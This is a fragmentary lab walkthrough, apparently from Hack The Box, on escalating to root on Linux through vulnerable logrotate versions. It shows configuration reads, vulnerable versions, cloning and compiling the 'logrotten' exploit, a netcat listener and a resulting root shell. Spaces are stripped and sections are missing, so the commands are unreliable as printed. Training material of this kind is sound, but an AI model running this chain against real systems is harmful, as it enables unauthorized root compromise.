...
```
icantthinkofaname23@htb[/htb]`$manlogrotate$# or$logrotate--helpUsage: logrotate [OPTION...] <configfile>
...
```
icantthinkofaname23@htb[/htb]`$cat/etc/logrotate.conf#see"man logrotate"fordetails#global optionsdonot affect preceding include directives#rotate log files weeklyweekly#use the adm group by default, since this is the owning group#of /var/log/syslog.su root adm#keep4weeks worth of backlogsrotate 4#create new(empty)log files after rotating old onescreate#usedateas a suffix of the rotatedfile#dateext#uncomment thisifyou want your log files compressed#compress#packages drop log rotation information into this directoryinclude /etc/logrotate.d#system-specific logs may also be configured here.`
```
...
```
icantthinkofaname23@htb[/htb]`$sudocat/var/lib/logrotate.status/var/log/samba/log.smbd" 2022-8-3
...
```
icantthinkofaname23@htb[/htb]`$ls/etc/logrotate.d/alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp`
```

```
icantthinkofaname23@htb[/htb]`$cat/etc/logrotate.d/dpkg/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
...
1. logrotate must run as a privileged user or`root`
1. vulnerable versions:- 3.8.6
- 3.11.0
- 3.15.0
- 3.18.0
...
```
`logger@nix02:~$gitclone https://github.com/whotwagner/logrotten.gitlogger@nix02:~$cdlogrottenlogger@nix02:~$gcc logrotten.c -o logrotten`
```
...
```
`logger@nix02:~$grep"create\|compress"/etc/logrotate.conf|grep-v"#"create`
```
...
```
icantthinkofaname23@htb[/htb]`$nc-nlvp9001Listening on 0.0.0.0 9001`
```
...
Connection received on 10.129.24.11 49818#iduid=0(root) gid=0(root) groups=0(root)`
```